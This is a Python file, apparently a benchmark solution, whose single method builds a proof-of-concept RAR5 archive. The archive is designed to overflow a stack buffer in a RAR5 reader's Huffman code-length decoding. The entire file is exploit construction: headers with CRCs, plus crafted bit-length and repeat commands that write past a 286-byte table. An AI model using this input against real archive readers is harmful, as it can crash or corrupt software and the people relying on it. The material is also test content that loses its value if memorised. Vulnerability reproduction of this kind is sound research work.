import zlib
import struct

class Solution:
    """
    Generates a PoC for a stack buffer overflow in a RAR5 reader's
    Huffman table parsing logic.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """

        def write_vint(n: int) -> bytes:
            """Encodes an integer as a RAR-style variable-length integer (VINT)."""
            res = bytearray()
            while True:
                b = n & 0x7f
                n >>= 7
                if n > 0:
                    b |= 0x80
                res.append(b)
                if n == 0:
                    break
            return bytes(res)

        def get_block_with_crc(data: bytes) -> bytes:
            """Prepends a CRC32 checksum to a block of data."""
            crc = zlib.crc32(data)
            return struct.pack('<I', crc) + data

        # 1. RAR5 Signature
        poc = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        # 2. Main Archive Header
        main_header_data = write_vint(1)  # Block type: Main archive header
        main_header_data += write_vint(0) # Block flags
        main_header_block_size = write_vint(len(main_header_data))
        main_header_block = get_block_with_crc(main_header_block_size + main_header_data)
        poc += main_header_block

        # 3. File Header + Compressed Data with malicious Huffman tables
        
        # 3.1. Malicious compressed data
        # The vulnerability is in the decoding of Huffman code lengths for the main
        # data tables (Lentz, DistLentz, AlignLentz). These lengths are themselves
        # compressed using a meta-table (BitLength) and RLE-like commands.
        # We craft a payload that causes the decoder to write past the end of the
        # Lentz buffer, which is 286 bytes long (MC+257 = 29+257).

        # BitLength table: meta-table for decoding other tables.
        # We define a prefix code set for symbols we need:
        # - Symbol 0 (literal length 0): code '0' (length 1)
        # - Symbol 16 (repeat previous): code '10' (length 2)
        # - Symbol 18 (long zero run):  code '11' (length 2)
        # This translates to BitLength[0]=1, BitLength[16]=2, BitLength[18]=2.
        bit_length_table = bytearray(10)
        bit_length_table[0] = 1   # BitLength[0]=1, BitLength[1]=0
        bit_length_table[8] = 2   # BitLength[16]=2, BitLength[17]=0
        bit_length_table[9] = 2   # BitLength[18]=2, BitLength[19]=0
        
        # Lentz table data (for literals and match lengths), target buffer size 286.
        # The plan is to fill the buffer with 285 zeros, then issue a repeat
        # command that writes 3 more values, overflowing the buffer.
        # - Use symbol 18 (code '11') with max count (19+255=274) to write 274 zeros.
        # - Write 11 literal zeros (symbol 0, code '0') to reach 285.
        # - Use symbol 16 (code '10') with min count (3+0=3) to repeat the last
        #   value (0) three times, writing to indices 285, 286, and 287.
        # The resulting bitstream is 26 bits long, packed into 4 bytes (LSB-first).
        lentz_data = b'\xff\x03\x80\x00'

        # DistLentz table data (for distances), target buffer size 60.
        # We fill it with 60 zeros using a single command to be well-formed.
        # - Symbol 18 (code '11'), count = 19 + 41 = 60.
        # The bitstream is 10 bits long, packed into 2 bytes.
        dist_lentz_data = b'\xa7\x00'

        # AlignLentz table data (for aligned distances), target buffer size 20.
        # Fill with 20 zeros using a single command.
        # - Symbol 18 (code '11'), count = 19 + 1 = 20.
        # The bitstream is 10 bits long, packed into 2 bytes.
        align_lentz_data = b'\x07\x00'

        huffman_tables = bytes(bit_length_table) + lentz_data + dist_lentz_data + align_lentz_data
        
        # A single dummy byte for the rest of the compressed stream data.
        dummy_data = b'\x00'
        compressed_data = huffman_tables + dummy_data
        
        # 3.2. File header fields
        file_header_fields = b''
        file_header_fields += write_vint(0)      # File flags
        file_header_fields += write_vint(1)      # Unpacked size
        file_header_fields += write_vint(0x20)   # File attributes (archive)
        
        # CompInfo: UnpVer=0, Solid=0, Method=3, Lg2Dic=15 (64k dictionary)
        # Value = (3<<7) | (15<<10) = 15744
        file_header_fields += write_vint(15744)
        
        file_header_fields += write_vint(2)      # Host OS: Unix
        file_header_fields += write_vint(1)      # File name length
        file_header_fields += b'a'               # File name
        
        # 3.3. Assemble the file block
        file_block_header = b''
        file_block_header += write_vint(2)  # Block type: File header
        file_block_header += write_vint(2)  # Block flags: has data area
        file_block_header += write_vint(len(compressed_data)) # Data area size
        
        file_block_data = file_block_header + file_header_fields + compressed_data
        file_block_size = write_vint(len(file_block_data))
        
        file_block = get_block_with_crc(file_block_size + file_block_data)
        poc += file_block
        
        # 4. End Of Archive Header
        end_header_data = write_vint(5)    # Block type: End of archive
        end_header_data += write_vint(1)   # Block flags: Archive end flag
        end_header_block_size = write_vint(len(end_header_data))
        end_header_block = get_block_with_crc(end_header_block_size + end_header_data)
        poc += end_header_block
        
        return poc